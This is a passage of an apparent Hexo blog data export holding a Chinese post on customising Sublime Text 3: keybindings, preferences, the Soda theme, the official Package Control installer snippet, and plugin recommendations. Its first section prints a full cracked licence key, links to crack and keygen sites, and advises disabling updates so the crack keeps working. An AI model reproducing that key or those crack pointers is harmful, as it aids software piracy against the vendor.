复制当前行到下一行\n    { \"keys\": [\"super+alt+down\"], \"command\": \"duplicate_line\" },\n    // 删除整行\n    { \"keys\": [\"super+d\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Delete Line.sublime-macro\"} },\n    // 光标移动到指定行\n    { \"keys\": [\"super+l\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \":\"} },\n    // 快速定位到选中的文字\n    { \"keys\": [\"super+k\"], \"command\": \"find_under_expand_skip\" },\n    // { \"keys\": [\"super+shift+x\"], \"command\": \"swap_case\" },\n    { \"keys\": [\"super+shift+x\"], \"command\": \"upper_case\" },\n    { \"keys\": [\"super+shift+y\"], \"command\": \"lower_case\" },\n    // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)\n    { \"keys\": [\"shift+enter\"], \"command\": \"run_macro_file\", \"args\": {\"file\": \"Packages/Default/Add Line.sublime-macro\"} },\n    // 定位到对于的匹配符(譬如{})(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)\n    { \"keys\": [\"super+shift+p\"], \"command\": \"move_to\", \"args\": {\"to\": \"brackets\"} },\n    // 这个命令默认使用的是super+shift+p\n    { \"keys\": [\"super+p\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"command_palette\"} },\n    // outline\n    { \"keys\": [\"super+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"@\"} },\n    // 当前文件中的关键字(方便快速查找内容)\n    { \"keys\": [\"super+alt+o\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"text\": \"#\"} },\n    // open resource\n    { \"keys\": [\"super+shift+r\"], \"command\": \"show_overlay\", \"args\": {\"overlay\": \"goto\", \"show_files\": true} },\n    // 文件内查找/替换\n    { \"keys\": [\"super+f\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"replace\"} },\n    // 全局查找/替换, 在查询结果中双击跳转到匹配位置\n    {\"keys\": [\"super+h\"], \"command\": \"show_panel\", \"args\": {\"panel\": \"find_in_files\"} },\n\n    // plugin配置\n    { \"keys\": [\"alt+a\"], \"command\": \"alignment\" },\n    {\"keys\": [\"super+shift+f\"], \"command\": \"js_format\"}\n]\n```\n\n## 三、插件\n\n### 1. Package Control\n最简单的方式是通过 ctrl+\\`快捷键打开控制台，粘贴以下代码到控制台执行。\n参见：[Package Control INSTALLATION](https://packagecontrol.io/installation#st3)\n\n#### Sublime Text 3\n``` python\nimport urllib.request,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by)\n```\n\n#### Sublime Text 2\n``` python\nimport urllib2,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation')\n```\n\n### 2. 实用插件\n- SideBarEnhancements左侧菜单栏增强\n- ConvertToUTF8\n- AutoFileName自动补全文件(目录)名\n- BracketHighlighter突出显示括号/引号\n- ColorHighlighter 背景显示16进制颜色\n- DocBlockr 生成注释模板\n- Sublime CodeIntel – 智能代码提示\n- FreeMarker:Freemarker模板语言辅助\n- SublimeCodeIntel 代码提示\n- JSHint、JsFormart、jQuery\n- Color Highlighter\n- Indent XML\n- sublimeLinter\n- pretty json\n\n\n参见：\n - [sublime Text3配置及快捷键、插件推荐总结](http://blog.csdn.net/xby1993/article/details/23995667)\n - [SublimeText2 快捷键一览表](http://blog.useasp.net/archive/2013/06/14/sublime-text-2-all-default-Shortcuts-table-on-windows-translated-with-chinese.aspx)\n\n","slug":"article/mac/打造个人专属Sublime Text 3","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxtj00555nbtjn75ggjd","content":"<p><img src=\"/asserts/images/logo/sublime.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><h3 id=\"1-下载与破解\"><a href=\"#1-下载与破解\" class=\"headerlink\" title=\"1. 下载与破解\"></a>1. 下载与破解</h3><p>当前可用的破解码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">—– BEGIN LICENSE —–</div><div class=\"line\">Andrew Weber</div><div class=\"line\">Single User License</div><div class=\"line\">EA7E-855605</div><div class=\"line\">813A03DD 5E4AD9E6 6C0EEB94 BC99798F</div><div class=\"line\">942194A6 02396E98 E62C9979 4BB979FE</div><div class=\"line\">91424C9D A45400BF F6747D88 2FB88078</div><div class=\"line\">90F5CC94 1CDC92DC 8457107A F151657B</div><div class=\"line\">1D22E383 A997F016 42397640 33F41CFC</div><div class=\"line\">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D</div><div class=\"line\">5CDB7036 E56DE1C0 EFCC0840 650CD3A6</div><div class=\"line\">B98FC99C 8FAC73EE D2B95564 DF450523</div><div class=\"line\">—— END LICENSE ——</div></pre></td></tr></table></figure></p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://www.xiumu.org/note/sublime-text-3.shtml\" target=\"_blank\" rel=\"external\">Sublime Text 3 破解版 + 注册机 + 汉化包 + 教程</a></li>\n<li><a href=\"http://www.waitsun.com/sublime-text-3-for-mac.html\" target=\"_blank\" rel=\"external\">Sublime Text 3 for Mac 3075 破解版 – Mac上强大的代码编辑神器</a></li>\n<li><a href=\"https://www.shuax.com/archives/SublimeText3Crack.html\" target=\"_blank\" rel=\"external\">Sublime Text 3破解补丁</a></li>\n</ul>\n<h3 id=\"2-Sublime-Text-2与Sublime-Text-3区别\"><a href=\"#2-Sublime-Text-2与Sublime-Text-3区别\" class=\"headerlink\" title=\"2. Sublime Text 2与Sublime Text 3区别\"></a>2. Sublime Text 2与Sublime Text 3区别</h3><p>简单的说：</p>\n<ul>\n<li>ST3支持在项目目录里面寻找变量提供了</li>\n<li>对标签页更好地支持（更多的命令和快捷键）</li>\n<li>加快了程序运行的速度</li>\n<li>更新了API，使用Python3.3</li>\n</ul>\n<p>参见：</p>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/25078353\" target=\"_blank\" rel=\"external\">Sublime Text3与Sublime Text 2的区别在哪里？</a></li>\n<li><a href=\"http://tutorial.jingwentian.com/Sublime-Text-3-Documentation/porting_guide.html\" target=\"_blank\" rel=\"external\">Sublime Text 3 文档之迁移指南</a></li>\n</ul>\n<h2 id=\"二、配置\"><a href=\"#二、配置\" class=\"headerlink\" title=\"二、配置\"></a>二、配置</h2><h3 id=\"1-我的配置\"><a href=\"#1-我的配置\" class=\"headerlink\" title=\"1. 我的配置\"></a>1. 我的配置</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">\t\"ignored_packages\":</div><div class=\"line\">\t[</div><div class=\"line\">\t\t\"Vintage\"</div><div class=\"line\">\t],</div><div class=\"line\"></div><div class=\"line\">\t// 字体</div><div class=\"line\">\t\"font_size\": 12,</div><div class=\"line\"></div><div class=\"line\">\t// 高亮当前行</div><div class=\"line\">\t\"highlight_line\": true,</div><div class=\"line\"></div><div class=\"line\">\t// 新标签页打开文件</div><div class=\"line\">\t\"preview_on_click\": false,</div><div class=\"line\"></div><div class=\"line\">\t//滚动能否超过结尾</div><div class=\"line\">\t\"scroll_past_end\": false,</div><div class=\"line\"></div><div class=\"line\">\t// TAB缩进宽度</div><div class=\"line\">\t\"tab_size\": 4,</div><div class=\"line\"></div><div class=\"line\">\t// 自动转换TAB为空格</div><div class=\"line\">\t\"translate_tabs_to_spaces\": false,</div><div class=\"line\"></div><div class=\"line\">\t// 皮肤</div><div class=\"line\">\t\"theme\": \"Soda Dark 3.sublime-theme\",</div><div class=\"line\"></div><div class=\"line\">\t// 关闭自动更新</div><div class=\"line\">\t\"update_check\": false,</div><div class=\"line\"></div><div class=\"line\">\t// 自动换行</div><div class=\"line\">\t\"word_wrap\": \"true\"</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"2-关闭自动更新\"><a href=\"#2-关闭自动更新\" class=\"headerlink\" title=\"2. 关闭自动更新\"></a>2. 关闭自动更新</h3><p>SublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">\"update_check\": false</div></pre></td></tr></table></figure></p>\n<h3 id=\"3-soda主题\"><a href=\"#3-soda主题\" class=\"headerlink\" title=\"3. soda主题\"></a>3. soda主题</h3><p>参见：<a href=\"https://github.com/buymeasoda/soda-theme/\" target=\"_blank\" rel=\"external\">https://github.com/buymeasoda/soda-theme/</a></p>\n<p>通过package controller安装Theme - Soda。</p>\n<h3 id=\"4-记住打开的文件\"><a href=\"#4-记住打开的文件\" class=\"headerlink\" title=\"4. 记住打开的文件\"></a>4. 记住打开的文件</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">\"remember_open_files\": false</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"5-Sublime-Text-2-使用-Eclipse-快捷键\"><a href=\"#5-Sublime-Text-2-使用-Eclipse-快捷键\" class=\"headerlink\" title=\"5. Sublime Text 2 使用 Eclipse 快捷键\"></a>5. Sublime Text 2 使用 Eclipse 快捷键</h3><p><a href=\"https://gist.github.com/ufologist/5590481#file-package-control-sublime-settings\" target=\"_blank\" rel=\"external\">Sublime Text User Preferences – Eclipse shortcuts for Sublime Text</a><br><a href=\"http://www.douban.com/note/276794943/\" target=\"_blank\" rel=\"external\">打造属于自己的前端开发神器 – 给Sublime Text加上Eclipse的光环</a></p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div></pre></td><td class=\"code\"><pre><div class=\"line\">[</div><div class=\"line\">    /**</div><div class=\"line\">     * 常用快捷键(Sublime默认)</div><div class=\"line\">     * --------------</div><div class=\"line\">     * </div><div class=\"line\">     * 光标一个单词一个单词的移动</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+left\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"words\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span>&#125; &#125;,</div><div class=\"line\">     * 按住shift来选文字时, 一个个单词的选而不是一个个字母</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+left\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"words\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span>, <span class=\"attr\">\"extend\"</span>: <span class=\"literal\">true</span>&#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 类似光标一个个单词的移动</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+left\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"subwords\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span>&#125; &#125;,</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+shift+right\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"by\"</span>: <span class=\"string\">\"subword_ends\"</span>, <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">true</span>, <span class=\"attr\">\"extend\"</span>: <span class=\"literal\">true</span>&#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 缩进</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+]\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"indent\"</span> &#125;,</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+[\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"unindent\"</span> &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 删除整个单词</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+backspace\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"delete_word\"</span>, <span class=\"attr\">\"args\"</span>: &#123; <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">false</span> &#125; &#125;,</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+delete\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"delete_word\"</span>, <span class=\"attr\">\"args\"</span>: &#123; <span class=\"attr\">\"forward\"</span>: <span class=\"literal\">true</span> &#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 行排序(例如选中几个JSON字段, 让这些字段名按字母顺序排序)</div><div class=\"line\">     * &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"f9\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"sort_lines\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"case_sensitive\"</span>: <span class=\"literal\">false</span>&#125; &#125;,</div><div class=\"line\">     *</div><div class=\"line\">     * 参考</div><div class=\"line\">     * ----------------------</div><div class=\"line\">     * Using Sublime Text as your IDE</div><div class=\"line\">     * http://www.chromium.org/developers/sublime-text</div><div class=\"line\">     *</div><div class=\"line\">     * Web Development With Sublime Text <span class=\"number\">2</span></div><div class=\"line\">     * http://www.paulund.co.uk/web-development-with-sublime-text<span class=\"number\">-2</span></div><div class=\"line\">     */</div><div class=\"line\"></div><div class=\"line\">    // editor配置</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+v\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"paste_and_indent\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+v\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"paste\"</span> &#125;,</div><div class=\"line\"></div><div class=\"line\">    /**</div><div class=\"line\">     * 适配eclipse快捷键</div><div class=\"line\">     *</div><div class=\"line\">     * 下面这位仁兄早就有了这个想法</div><div class=\"line\">     * Eclipse shortcuts for Sublime Text <span class=\"number\">2</span></div><div class=\"line\">     * http://icoloma.blogspot.com/<span class=\"number\">2011</span>/<span class=\"number\">10</span>/eclipse-shortcuts-for-sublime-text<span class=\"number\">-2.</span>html</div><div class=\"line\">     */</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+/\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"auto_complete\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+i\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"reindent\"</span> &#125;,</div><div class=\"line\">    // 当前行和下面一行交互位置</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+up\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"swap_line_up\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+down\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"swap_line_down\"</span> &#125;,</div><div class=\"line\">    // 复制当前行到上一行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+alt+up\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"duplicate_line\"</span> &#125;,</div><div class=\"line\">    // 复制当前行到下一行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+alt+down\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"duplicate_line\"</span> &#125;,</div><div class=\"line\">    // 删除整行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+d\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"run_macro_file\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"file\"</span>: <span class=\"string\">\"Packages/Default/Delete Line.sublime-macro\"</span>&#125; &#125;,</div><div class=\"line\">    // 光标移动到指定行</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+l\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"text\"</span>: <span class=\"string\">\":\"</span>&#125; &#125;,</div><div class=\"line\">    // 快速定位到选中的文字</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+k\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"find_under_expand_skip\"</span> &#125;,</div><div class=\"line\">    // &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+x\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"swap_case\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+x\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"upper_case\"</span> &#125;,</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+y\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"lower_case\"</span> &#125;,</div><div class=\"line\">    // 在当前行的下一行插入空行(这时鼠标可以在当前行的任一位置, 不一定是最后)</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"shift+enter\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"run_macro_file\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"file\"</span>: <span class=\"string\">\"Packages/Default/Add Line.sublime-macro\"</span>&#125; &#125;,</div><div class=\"line\">    // 定位到对于的匹配符(譬如&#123;&#125;)(从前面定位后面时,光标要在匹配符里面,后面到前面,则反之)</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+p\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"move_to\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"to\"</span>: <span class=\"string\">\"brackets\"</span>&#125; &#125;,</div><div class=\"line\">    // 这个命令默认使用的是super+shift+p</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+p\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"command_palette\"</span>&#125; &#125;,</div><div class=\"line\">    // outline</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+o\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"text\"</span>: <span class=\"string\">\"@\"</span>&#125; &#125;,</div><div class=\"line\">    // 当前文件中的关键字(方便快速查找内容)</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+alt+o\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"text\"</span>: <span class=\"string\">\"#\"</span>&#125; &#125;,</div><div class=\"line\">    // open resource</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+r\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_overlay\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"overlay\"</span>: <span class=\"string\">\"goto\"</span>, <span class=\"attr\">\"show_files\"</span>: <span class=\"literal\">true</span>&#125; &#125;,</div><div class=\"line\">    // 文件内查找/替换</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+f\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_panel\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"panel\"</span>: <span class=\"string\">\"replace\"</span>&#125; &#125;,</div><div class=\"line\">    // 全局查找/替换, 在查询结果中双击跳转到匹配位置</div><div class=\"line\">    &#123;<span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+h\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"show_panel\"</span>, <span class=\"attr\">\"args\"</span>: &#123;<span class=\"attr\">\"panel\"</span>: <span class=\"string\">\"find_in_files\"</span>&#125; &#125;,</div><div class=\"line\"></div><div class=\"line\">    // plugin配置</div><div class=\"line\">    &#123; <span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"alt+a\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"alignment\"</span> &#125;,</div><div class=\"line\">    &#123;<span class=\"attr\">\"keys\"</span>: [<span class=\"string\">\"super+shift+f\"</span>], <span class=\"attr\">\"command\"</span>: <span class=\"string\">\"js_format\"</span>&#125;</div><div class=\"line\">]</div></pre></td></tr></table></figure>\n<h2 id=\"三、插件\"><a href=\"#三、插件\" class=\"headerlink\" title=\"三、插件\"></a>三、插件</h2><h3 id=\"1-Package-Control\"><a href=\"#1-Package-Control\" class=\"headerlink\" title=\"1. Package Control\"></a>1. Package Control</h3><p>最简单的方式是通过 ctrl+`快捷键打开控制台，粘贴以下代码到控制台执行。<br>参见：<a href=\"https://packagecontrol.io/installation#st3\" target=\"_blank\" rel=\"external\">Package Control INSTALLATION</a></p>\n<h4 id=\"Sublime-Text-3\"><a href=\"#Sublime-Text-3\" class=\"headerlink\" title=\"Sublime Text 3\"></a>Sublime Text 3</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> urllib.request,os,hashlib; h = <span class=\"string\">'2915d1851351e5ee549c20394736b442'</span> + <span class=\"string\">'8bc59f460fa1548d1514676163dafc88'</span>; pf = <span class=\"string\">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( <span class=\"string\">'http://packagecontrol.io/'</span> + pf.replace(<span class=\"string\">' '</span>, <span class=\"string\">'%20'</span>)).read(); dh = hashlib.sha256(by).hexdigest(); print(<span class=\"string\">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h)) <span class=\"keyword\">if</span> dh != h <span class=\"keyword\">else</span> open(os.path.join( ipp, pf), <span class=\"string\">'wb'</span> ).write(by)</div></pre></td></tr></table></figure>\n<h4 id=\"Sublime-Text-2\"><a href=\"#Sublime-Text-2\" class=\"headerlink\" title=\"Sublime Text 2\"></a>Sublime Text 2</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> urllib2,os,hashlib; h = <span class=\"string\">'2915d1851351e5ee549c20394736b442'</span> + <span class=\"string\">'8bc59f460fa1548d1514676163dafc88'</span>; pf = <span class=\"string\">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(ipp) <span class=\"keyword\">else</span> <span class=\"keyword\">None</span>; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( <span class=\"string\">'http://packagecontrol.io/'</span> + pf.replace(<span class=\"string\">' '</span>, <span class=\"string\">'%20'</span>)).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), <span class=\"string\">'wb'</span> ).write(by) <span class=\"keyword\">if</span> dh == h <span class=\"keyword\">else</span> <span class=\"keyword\">None</span>; print(<span class=\"string\">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h) <span class=\"keyword\">if</span> dh != h <span class=\"keyword\">else</span> <span class=\"string\">'Please restart Sublime Text to finish installation'</span>)</div></pre></td></tr></table></figure>\n<h3 id=\"2-实用插件\"><a href=\"#2-实用插件\" class=\"headerlink\" title=\"2. 实用插件\"></a>2. 实用插件</h3><ul>\n<li>SideBarEnhancements左侧菜单栏增强</li>\n<li>ConvertToUTF8</li>\n<li>AutoFileName自动补全文件(目录)名</li>\n<li>BracketHighlighter突出显示括号/引号</li>\n<li>ColorHighlighter 背景显示16进制颜色</li>\n<li>DocBlockr 生成注释模板</li>\n<li>Sublime CodeIntel – 智能代码提示</li>\n<li>FreeMarker:Freemarker模板语言辅助</li>\n<li>SublimeCodeIntel 